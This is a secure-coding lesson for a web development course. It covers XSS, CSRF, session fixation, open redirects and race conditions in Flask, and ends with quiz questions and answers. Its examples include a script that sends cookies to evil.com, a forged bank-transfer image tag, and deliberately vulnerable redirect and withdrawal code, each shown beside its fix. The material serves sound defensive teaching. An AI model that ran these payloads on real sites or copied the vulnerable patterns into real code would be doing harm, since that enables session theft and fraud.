---
title: Day 27 — XSS, CSRF and Session Management
parent: Week 5 — Security, PWA and Assessment
nav_order: 3
---

# Day 27 — XSS, CSRF and Session Management

**Syllabus:** Design, develop and implement secure code — broken authentication and session management, cross-site scripting (XSS), cross-site request forgery (CSRF), invalid forwarding and redirecting, race conditions
**Outcomes:** SE-12-06
**Textbook:** Secure Software Architecture

---

## Key Terms

**XSS (Cross-Site Scripting)** — An attack where malicious scripts are injected into web pages viewed by other users.

**CSRF (Cross-Site Request Forgery)** — An attack that tricks an authenticated user into unknowingly submitting a request to a web application.

**CSRF token** — A unique, unpredictable value included in forms to verify that a request came from the legitimate application, not an attacker.

**Session hijacking** — Stealing a valid session token to impersonate an authenticated user.

**Open redirect** — A vulnerability where an application redirects users to an attacker-controlled URL based on unvalidated user input.

**Race condition** — A vulnerability where the outcome depends on the timing of concurrent operations, allowing attackers to exploit the gap between checking and acting.

---

## Theory

### Cross-Site Scripting (XSS)

XSS occurs when user-supplied data is rendered in a page without proper escaping, allowing JavaScript to execute in victims' browsers.

**Stored XSS** — malicious script saved to the database and served to all users:

```
Attacker submits comment: <script>document.location='https://evil.com/steal?c='+document.cookie</script>

Server stores it in database.
Every user who views the page executes the script.
Their session cookies are sent to the attacker.
Attacker uses stolen cookies to impersonate victims.
```

**Prevention:**

```python
# Jinja2 auto-escapes by default — DO NOT disable this
{{ user_comment }}          # safe — rendered as text
{{ user_comment | safe }}   # DANGEROUS — renders as HTML

# Set Content Security Policy header
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
```

**Reflected XSS** — script in a URL parameter reflected back in the page:

```
Attacker sends: https://site.com/search?q=<script>alert(1)</script>
If the app renders: <p>Results for: {{ query }}</p>
And query is not escaped — the script executes.
```

Jinja2's auto-escaping prevents this. Never use `| safe` with user input.

### Cross-Site Request Forgery (CSRF)

CSRF exploits the fact that browsers automatically include cookies with every request to a domain — including requests triggered by other sites.

**Attack scenario:**

```
1. User logs into bank.com — receives session cookie
2. User visits evil.com (in same browser)
3. evil.com contains: <img src="https://bank.com/transfer?to=attacker&amount=5000">
4. Browser sends GET to bank.com — including the session cookie
5. Bank processes the transfer as if the user requested it
```

**Prevention — CSRF tokens:**

```python
# Install flask-wtf for CSRF protection
pip install flask-wtf

from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)
```

```html
<!-- Include CSRF token in every form -->
<form method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <!-- form fields -->
    <button type="submit">Submit</button>
</form>
```

Flask-WTF validates the token automatically. POST requests without a valid token are rejected with 400.

**Additional CSRF mitigations:**
- Use POST (not GET) for state-changing actions
- Check the `Referer` or `Origin` header
- Use `SameSite=Strict` on session cookies

### Secure Session Management

```python
# Secure session configuration
app.config.update(
    SECRET_KEY='use-a-long-random-value-from-env',
    SESSION_COOKIE_SECURE=True,      # HTTPS only
    SESSION_COOKIE_HTTPONLY=True,    # not accessible via JavaScript
    SESSION_COOKIE_SAMESITE='Lax',   # CSRF protection
    PERMANENT_SESSION_LIFETIME=1800  # 30 minute timeout
)
```

**Session fixation attack:** attacker gives victim a known session ID before login. After login, attacker uses that ID.

**Prevention:** always regenerate the session after login:

```python
@app.route('/login', methods=['POST'])
def login():
    # validate credentials...
    if authenticated:
        session.clear()              # destroy old session
        session['user_id'] = user['id']
        session['logged_in'] = True
```

**Broken authentication checklist:**
- Passwords hashed with `werkzeug.security`
- Sessions regenerated on login
- Session timeout implemented
- Session invalidated on logout (`session.clear()`)
- Cookies set with `HttpOnly` and `Secure` flags

### Open Redirect

```python
# ❌ Vulnerable — redirects to any URL the attacker provides
next_url = request.args.get('next', '/')
return redirect(next_url)
# Attacker sends: /login?next=https://evil.com

# ✅ Safe — validate redirect target
from urllib.parse import urlparse

def is_safe_redirect(url):
    parsed = urlparse(url)
    return not parsed.netloc and not parsed.scheme

@app.route('/login', methods=['POST'])
def login():
    next_url = request.args.get('next', '/')
    if not is_safe_redirect(next_url):
        next_url = '/'
    return redirect(next_url)
```

### Race Conditions

A race condition occurs when two operations check-then-act on the same resource concurrently.

**Example — insufficient funds check:**

```python
# ❌ Vulnerable to race condition
def withdraw(user_id, amount):
    balance = get_balance(user_id)    # check
    if balance >= amount:
        time.sleep(0.1)              # gap — another request can run here
        set_balance(user_id, balance - amount)  # act

# Two simultaneous requests both pass the check before either acts.
# Both withdrawals proceed even with insufficient funds.

# ✅ Prevention — atomic database operation
def withdraw(user_id, amount):
    db.execute('''
        UPDATE accounts SET balance = balance - ?
        WHERE id = ? AND balance >= ?
    ''', (amount, user_id, amount))
    if db.rowcount == 0:
        raise InsufficientFundsError()
```

---

## Objective Response Questions

**1.** A web application displays user-submitted comments using `{{ comment | safe }}`. An attacker submits a comment containing `<script>document.cookie</script>`. What is the consequence?

- A) The comment is displayed as literal text with no effect
- B) The script executes in the browsers of all users who view the page, potentially stealing their session cookies
- C) Flask raises a security exception and blocks the response
- D) The `safe` filter sanitises the input before rendering

**Answer: B** — `| safe` disables escaping. The script is rendered as executable JavaScript. Remove `| safe` to fix.

---

**2.** A CSRF token is included in a login form. An attacker on evil.com tries to submit the form on behalf of a victim. Why does the CSRF token prevent this?

- A) The CSRF token encrypts the form data
- B) The attacker cannot read the CSRF token from the victim's browser due to same-origin policy, so they cannot include a valid token in their forged request
- C) The CSRF token blocks all cross-origin requests
- D) The token checks the user's IP address against the session

**Answer: B** — The same-origin policy prevents evil.com from reading content from bank.com. Without reading the token, the attacker cannot include it in the forged request.

---

**3.** After a successful login, a developer calls `session.clear()` before setting new session values. What attack does this prevent?

- A) XSS
- B) SQL injection
- C) CSRF
- D) Session fixation

**Answer: D** — Clearing the session on login ensures any pre-login session ID (potentially planted by an attacker) is destroyed and a new one issued.

---

## Try It

1. Install `flask-wtf` and enable CSRF protection on your app
2. Add `{{ csrf_token() }}` hidden fields to all your forms
3. Test that submitting a form without the token returns a 400 error (use curl or DevTools to remove the token field)
4. Add secure cookie configuration to your app config
5. Implement the `is_safe_redirect` function and use it in your login route
6. Review all your routes — identify any that perform state-changing operations via GET and convert them to POST
